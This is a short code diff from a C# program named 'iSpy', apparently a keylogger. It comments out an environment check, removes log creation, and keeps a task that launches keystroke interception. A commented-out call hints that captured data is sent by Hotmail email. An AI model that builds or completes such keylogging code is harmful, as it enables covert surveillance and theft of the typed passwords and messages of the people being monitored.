@@ -23,30 +23,26 @@ namespace iSpy
             // Passed
             ///HotmailEMail.SendEmail();
             //
-            // ***************************************************************************************************************
-
-
+            
             // Test rules
             // ************************************************************* TEST *******************************************8
-            bool result = SetEnvironmentcs.CheckAllRules();
+//            bool result = SetEnvironmentcs.CheckAllRules();
 
-            if (!result)
-            {
-                Console.WriteLine("No Access to..." + result.ToString());
-                Console.ReadLine();
-            }
-            else
-            {
-                Console.WriteLine("Access to..." + result.ToString());
-                Console.ReadLine();
-            }
+//#if DEBUG
+//            if (!result)
+//            {
+//                Console.WriteLine("No Access to..." + result.ToString());
+//                Console.ReadLine();
+//            }
+//            else
+//            {
+//                Console.WriteLine("Access to..." + result.ToString());
+//                Console.ReadLine();
+//            }
+//#endif         
             // **************************************************************************************************************8
 
-            // 1. Check if a log already ecists.
-            if (!LogService.DoesLogExist())
-                LogService.CreateNewLog();
 
-            
             // Start keyCapture()
             Task TStartKeyCapture = Task.Run(() => { InterceptKeys.Main();  });
 
